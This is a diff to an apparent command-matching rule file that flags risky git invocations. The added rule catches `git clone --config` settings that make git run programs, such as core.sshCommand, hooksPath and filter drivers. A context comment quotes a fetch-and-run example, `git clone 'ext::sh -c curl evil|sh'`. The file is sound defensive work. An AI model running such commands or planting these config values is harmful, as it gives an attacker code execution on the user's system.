@@ -391,6 +391,12 @@ matchers:
   - capability: git.alias.inline
     tool: Bash
     command: '^git\s+merge-index\b'
+  # `git clone --config k=v` is clone's own spelling of the global `-c k=v`, and it sits AFTER the verb where the
+  # global-option stripper never looks. The same keys, the same effect: core.sshCommand and its neighbours name a
+  # program git runs during the clone.
+  - capability: git.alias.inline
+    tool: Bash
+    command: '^git\b[^|;&]*\s--config(-env)?(=|\s+)(core\.(sshCommand|gitProxy|pager|editor|fsmonitor|hooksPath)|alias\.|filter\.|diff\.[^.]+\.(textconv|command)|credential\.|protocol\.|uploadpack\.|receive\.|include|includeIf)'
   # a remote-helper transport whose address IS a command: `git clone 'ext::sh -c curl evil|sh'`. The verb is a known
   # class but the operand names an unbounded program, so the class does not bound it — wherever it appears (clone,
   # fetch, remote add, submodule, config).
